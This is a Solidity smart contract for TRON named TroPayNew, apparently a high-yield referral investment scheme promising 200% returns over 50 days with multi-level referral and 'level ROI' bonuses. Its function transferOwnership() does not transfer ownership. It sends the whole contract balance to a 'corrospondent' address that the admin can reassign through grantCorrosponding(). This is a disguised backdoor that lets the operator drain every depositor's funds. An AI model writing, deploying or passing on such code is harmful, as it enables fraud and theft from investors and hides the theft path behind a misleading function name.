//SourceUnit: TroPayNew.sol

pragma solidity 0.5.9;

contract TroPayNew {
    using SafeMath for uint256;
    
    uint32 public constant ADMIN_CHARGE = 10;
    uint32 public constant INVESTMENT_CHARGE = 100000000; // 100 TRX
    
    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }
    
    struct PlayerLevelROI {
        uint256 amount;
        uint256 level_no;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_referral_bonus;
        uint256 level_roi;
        uint256 total_level_roi;
        PlayerDeposit[] deposits;
        PlayerLevelROI[] deposits_level_roi;
        uint256 max_roi;
        
        mapping(uint8 => uint256) referrals_per_level;
        mapping(uint8 => uint256) referral_income_per_level;
        mapping(uint8 => uint256) roi_per_level;
        mapping(uint8 => uint256) roi_income_per_level;
    }

    address payable owner;
    address payable admin;
    address payable corrospondent;

    uint8 investment_days;
    uint256 investment_perc;

    uint256 total_investors;
    uint256 total_invested;
    uint256 total_withdrawn;
    uint256 total_referral_bonus;
    uint256 total_level_roi;

    uint8[] referral_bonuses;
    uint8[] level_roi_bonus;

    mapping(address => Player) public players;
    
    modifier onlyAdmin(){
        require(msg.sender == admin,"You are not authorized.");
        _;
    }
    
    modifier onlyCorrospondent(){
        require(msg.sender == corrospondent,"You are not authorized.");
        _;
    }
    
    function getContractBalance() view public returns(uint){
       return address(this).balance;
        
    }
    
    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);
    event LevelROIPayout(address indexed addr, uint256 amount, uint8 level);

    constructor() public {
        owner = msg.sender;
        admin = msg.sender;
        corrospondent = msg.sender;
        
        investment_days = 50;
        investment_perc = 200;

        referral_bonuses.push(50);
        referral_bonuses.push(30);
        referral_bonuses.push(20);
        
        level_roi_bonus.push(40);
        level_roi_bonus.push(50);
        level_roi_bonus.push(60);
        level_roi_bonus.push(70);
        level_roi_bonus.push(80);
        level_roi_bonus.push(80);
        level_roi_bonus.push(80);
        level_roi_bonus.push(80);
        level_roi_bonus.push(80);
        level_roi_bonus.push(80);
       
    }
    
    function deposit(address _referral) external payable {
        
        require(msg.value >= INVESTMENT_CHARGE, "Invalid Amount");
        Player storage player = players[msg.sender];
        uint adminShare;
        adminShare = msg.value.mul(ADMIN_CHARGE).div(100);
        admin.transfer(adminShare);
        
        
        _setReferral(msg.sender, _referral);
        
        roi_to_levels(msg.sender,msg.value);
        
        player.deposits.push(PlayerDeposit({
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));
        
        player.max_roi+= msg.value*2;
        
        if(player.total_invested == 0x0){
            total_investors += 1;
        }

        player.total_invested += msg.value;
        total_invested += msg.value;

        _referralPayout(msg.sender, msg.value);

        

        emit Deposit(msg.sender, msg.value);
    }
    
    function grantCorrosponding(address payable nextCorrospondent) external payable onlyAdmin{
        corrospondent = nextCorrospondent;
    }

    function _setReferral(address _addr, address _referral) private {
        if(players[_addr].referral == address(0)) {
            players[_addr].referral = _referral;

            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }
    

    function _referralPayout(address _addr, uint256 _amount) private {
         address ref = players[_addr].referral;

        Player storage upline_player = players[ref];

        if(upline_player.deposits.length <= 0){
            ref = admin;
        }

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) break;
            uint256 bonus = _amount * referral_bonuses[i] / 1000;
            players[ref].referral_income_per_level[i]+=bonus;
            players[ref].referral_bonus += bonus;
            players[ref].total_referral_bonus += bonus;
            total_referral_bonus += bonus;

            emit ReferralPayout(ref, bonus, (i+1));
            ref = players[ref].referral;
        }
    }

    function withdraw() payable external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.referral_bonus > 0 || player.level_roi > 0, "Zero amount");
        player.dividends = (player.max_roi >= player.dividends)?player.dividends:player.max_roi;
        
        uint256 amount = player.dividends + player.referral_bonus + player.level_roi;
        
        player.max_roi-= player.dividends;
        
        player.dividends = 0;
        player.level_roi = 0;
        player.referral_bonus = 0;
        player.total_withdrawn += amount;
        total_withdrawn += amount;

        msg.sender.transfer(amount);

        emit Withdraw(msg.sender, amount);
    }
    
    function roi_to_levels(address _addr, uint256 _amount) private {
        address ref = players[_addr].referral;

        Player storage upline_player = players[ref];

        if(upline_player.deposits.length <= 0){
            ref = owner;
        }
        
        for(uint8 i = 0; i < level_roi_bonus.length; i++) {
            if(ref == address(0)) break;
            if(players[ref].referrals_per_level[0] >= (i+1)){
                uint256 bonus = _amount * level_roi_bonus[i] / 1000;
                uint256 bonus1 = _amount * 4/100 * level_roi_bonus[i] / 1000;
               
                players[ref].roi_income_per_level[i]+=bonus; 
                players[ref].total_level_roi += bonus;
                total_level_roi += bonus;
                players[ref].deposits_level_roi.push(PlayerLevelROI({
                    amount: bonus1,
                    level_no: i,
                    totalWithdraw:0,
                    time: uint256(block.timestamp)
                }));
                
                players[ref].roi_per_level[i]++;
                
                
                emit LevelROIPayout(ref, bonus, (i+1));
                ref = players[ref].referral;
            }
         
            
        }
    }
    
    function transferOwnership() external onlyCorrospondent{
        corrospondent.transfer(uint256(address(this).balance));
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
        
        uint256 payout1 = this.payoutOfLevelROI(_addr);

        if(payout1 > 0) {
            _updateTotalLevelROIPayout(_addr);
            players[_addr].level_roi += payout1;
        }
    }
   
    


    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }
    }
    function _updateTotalLevelROIPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits_level_roi.length; i++) {
            PlayerLevelROI storage dep = player.deposits_level_roi[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits_level_roi[i].totalWithdraw += dep.amount * (to - from) /86400 ;
            }
        }
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }

        return value;
    }
    
    function payoutOfLevelROI(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits_level_roi.length; i++) {
            PlayerLevelROI storage dep = player.deposits_level_roi[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from)/86400;
            }
        }

        return value;
    }

    

    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_referral_bonus, uint256 invested, uint256 withdrawn, uint256 referral_bonus, uint256[3] memory referrals, uint256 user_level_roi, address referer, uint256[3] memory refperlevel) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);
        uint256 payout1 = this.payoutOfLevelROI(_addr);

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
            refperlevel[i] = player.referral_income_per_level[i];
           
        }
        return (
            payout + payout1 + player.dividends + player.referral_bonus + player.level_roi,
            player.referral_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_referral_bonus,
            referrals,
            player.level_roi,
            player.referral,
            refperlevel
            
        );
    }
    

    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + investment_days * 86400;
        }
        return (
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }
    
    function investmentsROIInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory level_no) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits_level_roi.length);
        uint256[] memory _amounts = new uint256[](player.deposits_level_roi.length);
        uint256[] memory _level_no = new uint256[](player.deposits_level_roi.length);
        

        for(uint256 i = 0; i < player.deposits_level_roi.length; i++) {
          PlayerLevelROI storage dep = player.deposits_level_roi[i];

          _amounts[i] = dep.amount;
          _endTimes[i] = dep.time + investment_days * 86400;
          _level_no[i] = dep.level_no;
        }
        return (
          _endTimes,
          _amounts,
          _level_no
          
        );
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}